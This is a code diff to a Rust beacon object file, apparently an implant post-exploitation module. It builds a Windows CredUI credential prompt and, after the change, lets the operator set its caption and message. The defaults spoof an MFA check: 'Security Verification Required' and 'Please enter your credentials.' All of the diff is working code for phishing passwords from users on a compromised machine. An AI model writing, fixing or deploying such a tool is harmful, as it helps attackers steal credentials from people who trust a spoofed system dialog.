@@ -74,17 +74,27 @@ fn run(parser: &mut rustbof::data::DataParser) -> Result<(), &'static str> {
     let caption_s = String::from(parser.get_str());
     let message_s = String::from(parser.get_str());
 
-    let caption = if caption_s.is_empty() {
-        "Security Verification Required\0".as_bytes()
-    } else {
-        // use a static fallback — dynamic strings need separate buf
-        "Security Verification Required\0".as_bytes()
-    };
-    let message = if message_s.is_empty() {
-        "Your session requires MFA verification. Please enter your credentials.\0".as_bytes()
-    } else {
-        "Your session requires MFA verification. Please enter your credentials.\0".as_bytes()
-    };
+    // Copy user-supplied caption/message into NUL-terminated stack buffers, or
+    // fall back to a hardcoded default. The CREDUI_INFOA pszCaptionText /
+    // pszMessageText fields must point at NUL-terminated ANSI strings; the
+    // stack buffers below outlive the API call because `ui_info`, `cap_buf`,
+    // and `msg_buf` share this function's frame.
+    let cap_default = b"Security Verification Required";
+    let msg_default = b"Your session requires MFA verification. Please enter your credentials.";
+
+    let mut cap_buf = [0u8; 128];
+    let mut msg_buf = [0u8; 256];
+
+    let cap_src: &[u8] = if caption_s.is_empty() { cap_default } else { caption_s.as_bytes() };
+    let msg_src: &[u8] = if message_s.is_empty() { msg_default } else { message_s.as_bytes() };
+
+    let cap_n = cap_src.len().min(cap_buf.len() - 1);
+    cap_buf[..cap_n].copy_from_slice(&cap_src[..cap_n]);
+    cap_buf[cap_n] = 0;
+
+    let msg_n = msg_src.len().min(msg_buf.len() - 1);
+    msg_buf[..msg_n].copy_from_slice(&msg_src[..msg_n]);
+    msg_buf[msg_n] = 0;
 
     // Build CREDUI_INFOA (40 bytes on x64)
     let mut ui_info = [0u8; 40];
@@ -92,10 +102,10 @@ fn run(parser: &mut rustbof::data::DataParser) -> Result<(), &'static str> {
     unsafe { core::ptr::write_unaligned(ui_info.as_mut_ptr() as *mut u32, 40u32) };
     // hwndParent = NULL at offset 8 — already 0
     // pszMessageText at offset 16
-    let msg_ptr = message.as_ptr() as usize;
+    let msg_ptr = msg_buf.as_ptr() as usize;
     unsafe { core::ptr::write_unaligned(ui_info.as_mut_ptr().add(16) as *mut usize, msg_ptr) };
     // pszCaptionText at offset 24
-    let cap_ptr = caption.as_ptr() as usize;
+    let cap_ptr = cap_buf.as_ptr() as usize;
     unsafe { core::ptr::write_unaligned(ui_info.as_mut_ptr().add(24) as *mut usize, cap_ptr) };
 
     let mut auth_pkg: u32 = 0;
